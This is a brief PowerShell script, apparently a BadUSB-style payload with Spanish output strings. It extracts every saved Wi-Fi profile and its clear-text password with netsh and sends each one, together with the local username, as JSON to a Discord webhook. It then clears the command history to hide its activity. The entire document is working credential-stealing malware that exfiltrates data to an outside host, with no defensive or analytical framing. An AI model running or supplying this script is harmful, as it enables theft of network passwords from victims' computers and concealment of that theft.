Write-Output "Comenzando payload"
netsh wlan show profile | Select-String '(?<=Perfil de todos los usuarios\s+:\s).+' | ForEach-Object {
    $wlan  = $_.Matches.Value
    $passw = netsh wlan show profile $wlan key=clear | Select-String '(?<=Contenido de la clave\s+:\s).+' 
	Write-Output "WIFI "+$wlan
	$Body = @{
		'username' = $env:username + " | " + [string]$wlan
		'content' = [string]$passw
	}
	
	# Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
	Invoke-RestMethod -ContentType 'Application/Json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json) > salida.txt

}

Clear-History
